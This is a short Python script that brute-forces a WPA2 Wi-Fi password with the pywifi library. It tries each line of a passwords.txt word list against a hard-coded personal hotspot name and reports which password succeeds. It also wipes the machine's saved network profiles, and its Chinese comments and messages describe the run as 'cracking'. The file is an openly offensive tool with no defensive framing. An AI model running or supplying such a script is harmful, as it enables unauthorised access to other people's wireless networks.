import time
import pywifi
from pywifi import const


def wifi_connect(password):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)
    status = ifaces.status()
    if status == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = "Not Joshuaâs iPhone"
        # 网卡开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = password
        # 删除所有wifi连接文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(4)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

    else:
        print("已连接")


def read_password():
    print("开始破解")
    path = "passwords.txt"
    file = open(path, "r")
    while True:
        try:
            pass_str = file.readline()
            connected = wifi_connect(pass_str)
            if connected:
                print("密码正确", pass_str)
            else:
                print("密码错误", pass_str)
        except:
            continue


if __name__ == '__main__':
    read_password()
